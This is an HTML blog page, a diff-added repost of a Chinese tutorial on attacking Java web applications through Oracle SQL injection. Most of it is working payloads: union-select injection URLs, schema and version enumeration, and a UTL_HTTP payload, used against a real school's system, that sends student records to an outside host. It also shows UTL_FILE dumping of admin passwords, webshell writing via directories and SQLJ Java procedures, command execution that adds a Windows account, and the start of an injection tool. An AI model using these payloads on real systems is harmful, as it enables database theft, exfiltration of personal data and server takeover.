@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>攻击JavaWeb应用 4 -SQL注入 2 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-10-21T19:56:10.000Z" itemprop="datePublished">
+          2013-10-22
+      </time>
+    
+    
+    | 
+    <a href='/tag/getshell/'>getshell</a>,
+    
+    <a href='/tag/Struts2/'>Struts2</a>
+    
+    
+</span>
+    <h1 class="post-title">攻击JavaWeb应用 4 -SQL注入 2</h1>
+    <section class="post-content">
+      <p><a href="http://drops.wooyun.org/tips/288" target="_blank" rel="external">攻击JavaWeb应用[4]-SQL注入[2]</a></p>  <p><a href="http://drops.wooyun.org/tips/288" target="_blank" rel="external">http://drops.wooyun.org/tips/288</a></p>  <h6>注:这一节主要是介绍Oracle和SQL注入工具相关，本应该是和前面的Mysql一起但是由于章节过长了没法看，所以就分开了。</h6>  <h5>0x00 Oracle</h5>  <hr align="center" width="100%" size="2">  <p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。</p>  <p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。这一次我们依旧使用上面的代码，数据库结构平移到Oracle上去，数据库名用的默认的orcl，字段&quot;corps_desc&quot; 从text改成了VARCHAR2(4000)，JSP内的驱动和URL改成了对应的Oracle。    <br>    <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image001.png" target="_blank" rel="external"><img title="clip_image001" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="749" alt="clip_image001" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image001_thumb.png" width="1386" border="0"></a></p>  <p>Jsp页面代码：    <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image002.png" target="_blank" rel="external"><img title="clip_image002" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="640" alt="clip_image002" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image002_thumb.png" width="1328" border="0"></a></p>  <p>开始注入：</p>  <p><code>Union +order by</code> 永远都是最快捷最实用的，而盲注什么的太费时费力了。</p><br><a id="more"></a><br><p></p>  <p>依旧提交order by 去猜测显示当前页面所用的SQL查询了多少个字段，也就是确认查询字段数。</p>  <p>分别提交<code><a href="http://localhost/SqlInjection/index.jsp?id=1" target="_blank" rel="external">http://localhost/SqlInjection/index.jsp?id=1</a> AND 1=1</code> 和<code>?id=1 AND 1=12</code> 得到的页面明显不一致，1=12页面没有任何数据，即1=12为false没查询到任何结果。     <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image003.png" target="_blank" rel="external"><img title="clip_image003" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="421" alt="clip_image003" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image003_thumb.png" width="1035" border="0"></a></p>  <pre><code><a href="http://localhost/SqlInjection/index.jsp?id=1" target="_blank" rel="external">http://localhost/SqlInjection/index.jsp?id=1</a> AND 1=12</code></pre><br><br><p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image004.png" target="_blank" rel="external"><img title="clip_image004" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="247" alt="clip_image004" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image004_thumb.png" width="724" border="0"></a></p>
+
+<p>提交：<code><a href="http://localhost/SqlInjection/index.jsp?id=1" target="_blank" rel="external">http://localhost/SqlInjection/index.jsp?id=1</a> ORDER BY 4–</code> 页面正常，提交：<code>?id=1 ORDER BY 5–</code>报错说明字段数肯定是4。</p>
+
+<p><code>Order by 5</code>爆出的错误信息：<br><br>  <br>￼<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image005.png" target="_blank" rel="external"><img title="clip_image005" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="559" alt="clip_image005" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image005_thumb.png" width="1098" border="0"></a></p>
+
+<h6>使用union 进行联合查询：</h6>
+
+<h6>Oracle的dual表：</h6>
+
+<p>dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录，在Oracle注入中用途可谓广泛。</p>
+
+<h6>Oracle union 查询 tips:</h6>
+
+<p>Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你<code>union select</code>的要和前面的</p>
+
+<pre><code>SELECT * from &quot;corps&quot; where &quot;id&quot; = 1 </code></pre>
+
+<p>当中查询的字段类型一致。我们已知查询的第二个字段是corps_name，对应的数据类型是：VARCHAR2(100)，也就是字符型。当我们传入整型的数字时就会报错。比如当我们提交union查询时提交如下SQL注入语句：</p>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 1,2,NULL,NULL FROM dual--</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image006.png" target="_blank" rel="external"><img title="clip_image006" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="480" alt="clip_image006" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image006_thumb.png" width="905" border="0"></a></p>
+
+<p>Oracle当中正确的注入方式用NULL去占位在我们未知哪个字段是什么类型的时候：</p>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT NULL,NULL,NULL,NULL FROM dual--</code></pre>
+
+<p>当已知第一个字段是整型的时候：</p>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT 1,NULL,NULL,NULL FROM dual--</code></pre>
+
+<p>SQL执行后的占位效果：<br>  <br>￼<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image007.png" target="_blank" rel="external"><img title="clip_image007" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="339" alt="clip_image007" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image007_thumb.png" width="1210" border="0"></a></p>
+
+<p>根据我们之前注入Mysql的经验，我们现在要尽可能多的去获取服务器信息和数据库，比如数据库版本、权限等。</p>
+
+<p>在讲Mysql注入的时候已经说道要合理利用工具，在Navicat客户端执行<code>select * from session_roles</code>结果：<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image008.png" target="_blank" rel="external"><img title="clip_image008" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="296" alt="clip_image008" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image008_thumb.png" width="316" border="0"></a></p>
+
+<h6>Oracle查询分页tips：</h6>
+
+<p>不得不说Oracle查询分页的时候没有Mysql那么方便，Oracle可不能limit 0,1而是通过三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”取交集不就是1么？我数学5分党，如果有关数学方面的东西讲错了各位莫怪)：</p>
+
+<pre><code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;= 0 </code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image009.png" target="_blank" rel="external"><img title="clip_image009" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="267" alt="clip_image009" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image009_thumb.png" width="959" border="0"></a></p>
+
+<p>在Oracle里面没有类似于Mysql的group_concat,用分页去取数据，不过有更加简单的方法。</p>
+
+<h6>用UNION SELECT 查询：</h6>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 UNION ALL SELECT NULL, NULL, NULL, NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32)) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image010.png" target="_blank" rel="external"><img title="clip_image010" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="574" alt="clip_image010" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image010_thumb.png" width="1383" border="0"></a></p>
+
+<p>不过我得告诉你，UNION SELECT查询返回的是多个结果，而在正常的业务逻辑当中我们取一条新闻是直接放到对应的实体当中的，比如我们查询的wooyun的厂商表：corps，那么我们做查询的很有可能是抽象出一个corps对象，在DAO层取得到单个的参数结果集，如果有多个要么报错，要么取出第一条。然后再到controller层把查询的结果放到请求里面。最终在输出的时候自然也就只能拿到单个的corps实体，这也是视图层只做展示把业务逻辑和视图分开的好处之一，等讲到MVC的时候试着给不懂的朋友解释一下。</p>
+
+<p>再来看一下我们丑陋的在页面展示数据的代码：<br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image011.png" target="_blank" rel="external"><img title="clip_image011" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="282" alt="clip_image011" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image011_thumb.png" width="1093" border="0"></a></p>
+
+<p>接下来的任务就是收集信息了，上面我们已经收集到数据库所有的用户的用户名和我们当前用户的权限。</p>
+
+<p>获取所有的数据库表：</p>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 UNION ALL SELECT NULL, NULL, NULL, NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(45)||CHR(45)||CHR(45)||CHR(45)||CHR(45)||CHR(45)||NVL(CAST(TABLE_NAME AS VARCHAR(4000)),CHR(32)) FROM SYS.ALL_TABLES WHERE OWNER IN (CHR(67)||CHR(84)||CHR(88)||CHR(83)||CHR(89)||CHR(83),CHR(69)||CHR(88)||CHR(70)||CHR(83)||CHR(89)||CHR(83),CHR(77)||CHR(68)||CHR(83)||CHR(89)||CHR(83),CHR(79)||CHR(76)||CHR(65)||CHR(80)||CHR(83)||CHR(89)||CHR(83),CHR(83)||CHR(67)||CHR(79)||CHR(84)||CHR(84),CHR(83)||CHR(89)||CHR(83),CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77),CHR(87)||CHR(77)||CHR(83)||CHR(89)||CHR(83))—</code></pre>
+
+<p>连接符我用的是-转换成编码也就是45&#160; <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image012.png" target="_blank" rel="external"><img title="clip_image012" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="466" alt="clip_image012" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image012_thumb.png" width="440" border="0"></a></p>
+
+<p>已列举出所有的表名：<br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image013.png" target="_blank" rel="external"><img title="clip_image013" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="708" alt="clip_image013" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image013_thumb.png" width="1384" border="0"></a></p>
+
+<p>当UNION ALL SELECT 不起作用的时候我们可以用上面的Oracle分页去挨个读取，缺点就是效率没有UNION ALL SELECT高。</p>
+
+<p>信息版本获取：</p>
+
+<pre><code>http://localhost/SqlInjection/index.jsp?id=1 and 1=2 UNION SELECT NULL, NULL, NULL, (select banner from sys.v_$version where rownum=1) from dual—</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image014.png" target="_blank" rel="external"><img title="clip_image014" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="407" alt="clip_image014" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image014_thumb.png" width="1034" border="0"></a></p>
+
+<p>获取启动Oracle的用户名:</p>
+
+<pre><code>select SYS_CONTEXT ('USERENV','OS_USER') from dual;</code></pre>
+
+<p>服务器监听IP:</p>
+
+<pre><code>select utl_inaddr.get_host_address from dual;</code></pre>
+
+<p>服务器操作系统:</p>
+
+<pre><code>select member from v$logfile where rownum=1;</code></pre>
+
+<p>当前连接用户:</p>
+
+<pre><code>select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual;</code></pre>
+
+<p>获取当前连接的数据库名：</p>
+
+<pre><code>select SYS_CONTEXT ('USERENV', 'DB_NAME') from dual;</code></pre>
+
+<p>关于获取敏感的表和字段说明：</p>
+
+<p>1、获取所有的字段schema：</p>
+
+<pre><code>select * from user_tab_columns</code></pre>
+
+<p>2、获取当前用户权限下的所有的表：</p>
+
+<pre><code>SELECT * FROM&#160; User_tables</code></pre>
+
+<p>上述SQL通过添加Where条件就能获取到常见注入的敏感信息，请有心学习的同学按照上面的MYSQL注入时通过information_schema获取敏感字段的方式去学习user_tab_columns和FROM&#160; User_tables表。<br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image015.png" target="_blank" rel="external"><img title="clip_image015" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="702" alt="clip_image015" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image015_thumb.png" width="1381" border="0"></a><br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image016.png" target="_blank" rel="external"><img title="clip_image016" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="333" alt="clip_image016" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image016_thumb.png" width="1362" border="0"></a></p>
+
+<h6>Oracle高级注入：</h6>
+
+<h6>1、友情备份</h6>
+
+<p>在讲Mysql的时候提到过怎么在注入点去构造SQL语句去实现友情备份，在去年注入某大牛学校的教务处的时候我想到了一个简单有效的SQL注入点友情备份数据库的方法。没错就是利用Oracle的utl_http包。Oracle的确是非常的强大，utl_http就能过直接对外发送Http请求。我们可以利用utl_http去SQL注入，那么我们一样可以利用utl_http去做友情备份。</p>
+
+<p>构建以下SQL注入语句：</p>
+
+<pre><code>http://60.xxx.xx.131/xxx/aao_66/index.jsp?fid=1+and+'1'in(SELECT+UTL_HTTP.request('http://xxx.cn:8080/xxxx/mysql.jsp?data='||ID||'----'||USERID||'----'||NAME||'----'||RELATION||'----'||OCCUPATION||'----'||POSITION||'----'||ASSN||UNIT||'----'||'----'||TEL)+FROM+STU_HOME)</code></pre>
+
+<p>UTL_HTTP 会带着查询数据库的结果去请求我们的URL，也就是我注入点上写的URL。Tips：UTL_HTTP是一条一条的去请求的，所以会跟数据库保持一个长连接。而数据量过大的话会导致数据丢失，如果想完整的友情备份这种方法并不是特别可行。只用在浏览器上请求这个注入点Oracle会自动的把自己的裤子送上门来那种感觉非常的好。</p>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image017.png" target="_blank" rel="external"><img title="clip_image017" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="354" alt="clip_image017" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image017_thumb.png" width="1118" border="0"></a></p>
+
+<p>使用UTL_HTTP友情备份效果图：<br>  <br>￼<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image018.png" target="_blank" rel="external"><img title="clip_image018" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="530" alt="clip_image018" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image018_thumb.png" width="584" border="0"></a></p>
+
+<p>utl_http在注入的时候怎么去利用同理，由于我也没有去深入了解utl_http或许他还有其他的更实用的功能等待你去发现。</p>
+
+<h6>使用UTL_FILE友情备份：</h6>
+
+<p>创建目录：</p>
+
+<pre><code>create or replace directory cux_log_dir as 'E:/soft/apache-tomcat-7.0.37/webapps/ROOT/selina';&#160; </code></pre>
+
+<p>导出数据到文件：</p>
+
+<pre><code>declare</code></pre>
+
+<pre><code>&#160;&#160;&#160; frw&#160;&#160; utl_file.file_type;</code></pre>
+
+<pre><code>&#160;&#160;&#160; begin</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; frw:=utl_file.fopen('CUX_LOG_DIR','emp.txt','w');</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; for rec in (select * from admin) loop</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; utl_file.put_line(frw,rec.id||','||rec.password);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; end loop;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; utl_file.fclose(frw);</code></pre>
+
+<pre><code>&#160;&#160;&#160; end;</code></pre>
+
+<pre><code>/</code></pre>
+
+<p>效果图：<br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image019.png" target="_blank" rel="external"><img title="clip_image019" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="651" alt="clip_image019" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image019_thumb.png" width="1065" border="0"></a></p>
+
+<h6>GetShell</h6>
+
+<p>之前的各种Oracle文章似乎都提过怎样去getshell，其实方法倒是有的。但是在Java里面你要想拿到WEB的根路径比那啥还难。但是PHP什么的就不一样了，PHP里面爆个路径完全是家常便饭。因为数据库对开发语言的无关系，所以或许我们在某些场合下以下的getshell方式也是挺不错的。</p>
+
+<p>在有Oracle连接权限没有webshell时候通过utl_file获取shell</p>
+
+<p>（当然用户必须的具有创建DIRECTORY的权限）:</p>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image020.png" target="_blank" rel="external"><img title="clip_image020" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="172" alt="clip_image020" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image020_thumb.png" width="597" border="0"></a></p>
+
+<p>执行：</p>
+
+<pre><code>create or replace directory getshell_dir as 'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/';</code></pre>
+
+<p>当然了as后面跟的肯定是你的WEB路径。</p>
+
+<p>执行以下SQL语句：</p>
+
+<p>创建目录：</p>
+
+<pre><code>create or replace directory getshell_dir as 'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/';</code></pre>
+
+<p>写入shell到指定目录：注意directory在这里一定要大写:</p>
+
+<pre><code>declare</code></pre>
+
+<pre><code>&#160;&#160;&#160; frw&#160;&#160; utl_file.file_type;</code></pre>
+
+<pre><code>&#160;&#160;&#160; begin</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; frw:=utl_file.fopen('GETSHELL_DIR','yzmm.jsp','w');</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; utl_file.put_line(frw,'hello world.');</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; utl_file.fclose(frw);</code></pre>
+
+<pre><code>&#160;&#160;&#160; end;</code></pre>
+
+<pre><code>/</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image021.png" target="_blank" rel="external"><img title="clip_image021" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="671" alt="clip_image021" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image021_thumb.png" width="1275" border="0"></a></p>
+
+<p>在低权限下<a href="http://Ha.Cker.In/tag/getshell" target="_blank">getshell</a>：<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image022.png" target="_blank" rel="external"><img title="clip_image022" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="684" alt="clip_image022" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image022_thumb.png" width="1132" border="0"></a></p>
+
+<p>执行以下SQL创建表空间：</p>
+
+<pre><code>create tablespace shell datafile 'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/shell.jsp' size 100k nologging ;</code></pre>
+
+<pre><code>CREATE TABLE SHELL(C varchar2(100)) tablespace shell;</code></pre>
+
+<pre><code>insert into SHELL values('hello world');</code></pre>
+
+<pre><code>commit;</code></pre>
+
+<pre><code>alter tablespace shell offline;</code></pre>
+
+<pre><code>drop tablespace shell including contents;</code></pre>
+
+<p>这方法是能写文件，但是好像没发现我的hello world，难道是我打开方式不对？</p>
+
+<p>Oracle SQLJ编译执行Java代码：</p>
+
+<p>众所周知，由于sun那只土鳖不争气居然被oracle给收购了。</p>
+
+<p>不过对Oracle来说的确是有有不少优势的。</p>
+
+<p>SQLJ是一个与Java编程语言紧密集成的嵌入式SQL的版本，这里&quot;嵌入式SQL&quot;是用来在其宿主通用编程语言如C、C++、Java、Ada和COBOL）中调用SQL语句。SQL翻译器用SQLJ运行时库中的调用来替代嵌入式SQLJ语句，该运行时库真正实现SQL操作。这样翻译的结果是得到一个可使用任何Java翻译器进行编译的Java源程序。一旦Java源程序被编译，Java执行程序就可在任何数据库上运行。SQLJ运行环境由纯Java实现的小SQLJ运行库（小，意指其中包括少量的代码）组成，该运行时库转而调用相应数据库的JDBC驱动程序。</p>
+
+<p>SQLJ可以这样玩：首先创建一个类提供一个静态方法：&#160; <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image023.png" target="_blank" rel="external"><img title="clip_image023" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="266" alt="clip_image023" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image023_thumb.png" width="607" border="0"></a></p>
+
+<p>其中的getShell是我们的方法名，p和才是参数，p是路径，而c是要写的文件内容。在创建Java存储过程的时候方法类型必须是静态的static</p>
+
+<p>执行以下SQL创建Java储存过程：</p>
+
+<pre><code>create or replace and compile</code></pre>
+
+<pre><code>java source named &quot;getShell&quot;</code></pre>
+
+<pre><code>as public class GetShell {public static int getShell(String p, String c) {int RC = -1;try {new java.io.FileOutputStream(p).write(c.getBytes());RC = 1;} catch (Exception e) {e.printStackTrace();}return RC;}}</code></pre>
+
+<p>创建函数：</p>
+
+<pre><code>create or replace</code></pre>
+
+<pre><code>function getShell(p in varchar2, c in varchar2) return number</code></pre>
+
+<pre><code>as</code></pre>
+
+<pre><code>language java</code></pre>
+
+<pre><code>name 'util.getShell(java.lang.String, java.lang.String) return Integer';</code></pre>
+
+<p>创建存储过程：</p>
+
+<pre><code>create or replace procedure RC(p in varChar, c in varChar)</code></pre>
+
+<pre><code>as</code></pre>
+
+<pre><code>x number;</code></pre>
+
+<pre><code>begin</code></pre>
+
+<pre><code>x := getShell(p,c);</code></pre>
+
+<pre><code>end;</code></pre>
+
+<p>授予Java权限：</p>
+
+<pre><code>variable x number;</code></pre>
+
+<pre><code>set serveroutput on;</code></pre>
+
+<pre><code>exec dbms_java.set_output(100000);</code></pre>
+
+<pre><code>grant javasyspriv to system;</code></pre>
+
+<pre><code>grant javauserpriv to system;</code></pre>
+
+<p>写webshell：</p>
+
+<pre><code>exec :x:=getShell('d:/3.txt','selina');</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image024.png" target="_blank" rel="external"><img title="clip_image024" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="633" alt="clip_image024" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image024_thumb.png" width="499" border="0"></a></p>
+
+<h6>SQLJ执行cmd命令：</h6>
+
+<p>方法这里和上面几乎大同小异，一样的提供一个静态方法，然后去创建一个存储过程。然后调用Java里的方法去执行命令。</p>
+
+<p>创建Java存储过程:</p>
+
+<pre><code>create or replace and compile java source named &quot;Execute&quot; as&#160;&#160; </code></pre>
+
+<pre><code>import java.io.BufferedReader;</code></pre>
+
+<pre><code>import java.io.InputStreamReader;</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>public class Execute {</code></pre>
+
+<pre><code>&#160;&#160;&#160; public static void executeCmd(String c) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; try {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; String l=&quot;&quot;,t;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; BufferedReader br = new BufferedReader(new InputStreamReader(java.lang.Runtime.getRuntime().exec(c).getInputStream(),&quot;gbk&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; while((t=br.readLine())!=null){</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; l+=t+&quot;\n&quot;;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(l);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; } catch (Exception e) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; e.printStackTrace();</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<pre><code>}</code></pre>
+
+<p>创建存储过程executeCmd：</p>
+
+<pre><code>create or replace procedure executeCmd(c in varchar2)</code></pre>
+
+<pre><code>as</code></pre>
+
+<pre><code>language java name 'Execute.executeCmd(java.lang.String)';</code></pre>
+
+<p>执行存储过程：</p>
+
+<pre><code>exec executeCmd('net user selina 123 /add');</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image025.png" target="_blank" rel="external"><img title="clip_image025" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="602" alt="clip_image025" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image025_thumb.png" width="696" border="0"></a></p>
+
+<p>上面提供的命令执行和getshell创建方式对换一下就能回显了，如果好不清楚怎么让命令执行后回显可以参考：</p>
+
+<p><a href="http://hi.baidu.com/xpy_home/item/09cbd9f3fd30ef0585d27833" target="_blank" rel="external">http://hi.baidu.com/xpy_home/item/09cbd9f3fd30ef0585d27833</a></p>
+
+<p>一个不错的SQLJ的demo（犀利的 oracle 注入技术）。</p>
+
+<p><a href="http://huaidan.org/archives/2437.html" target="_blank" rel="external">http://huaidan.org/archives/2437.html</a></p>
+
+<h5>0x01 自动化的SQL注入工具实现</h5>
+
+<hr align="center" width="100%" size="2">
+
+<p>通过上面我们对数据库和SQL注入的熟悉，现在可以自行动手开发注入工具了吧？</p>
+
+<p>很久以前非常粗糙的写了一个SQL注入工具类，就当作demo给大家做个演示了。</p>
+
+<p>仅提供核心代码，案例中的gov网站请勿非法攻击！</p>
+
+<p>简单的SQL Oder by 注入实现的方式核心代码：</p>
+
+<p>1、分析</p>
+
+<pre><code>URLpublic static void AnalysisUrls(String site) throws Exception</code></pre>
+
+<p>这个方法主要是去分析URL的组成是否静态化等。</p>
+
+<p>2、检测是否存在：</p>
+
+<p>这个做的粗糙了些，只是通过请求提交不同的SQL注入语句去检测页面返回的情况：</p>
+
+<pre><code>/**</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * </code><code>分析SQL</code><code>参数是否存在注入</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * @param str</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; */</code></pre>
+
+<pre><code>&#160;&#160;&#160; public static void&#160; AnalysisUrlDynamicParamSqlInjection(String str[]) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; content,content2;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; sqlKey = new ArrayList&lt;Object&gt;();</code></pre>
+
